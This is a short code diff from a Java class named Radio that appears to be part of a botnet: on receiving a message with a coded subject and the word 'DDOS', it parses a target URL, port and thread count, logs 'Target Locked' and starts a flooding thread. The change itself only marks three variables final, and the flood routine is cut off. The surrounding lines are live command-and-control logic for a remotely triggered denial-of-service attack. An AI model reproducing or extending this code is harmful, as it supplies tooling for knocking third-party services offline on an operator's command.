@@ -597,9 +597,9 @@ public class Radio
 			         else if (message.getSubject().matches("Nom d'un chien.") && message.getContent().toString().contains("DDOS")) {
 			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Flooder activated.");
 			        	 StringTokenizer st = new StringTokenizer(message.getContent().toString());
-			        	 String url = st.nextToken();
-			        	 int port = Integer.parseInt(st.nextToken());
-			        	 int threads = Integer.parseInt(st.nextToken());
+			        	 final String url = st.nextToken();
+			        	 final int port = Integer.parseInt(st.nextToken());
+			        	 final int threads = Integer.parseInt(st.nextToken());
 			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Flooder: Target Locked: " + url + " PORT " + port);
 			        	 Executors.newSingleThreadExecutor().execute(new Runnable() {
 			     		    @Override
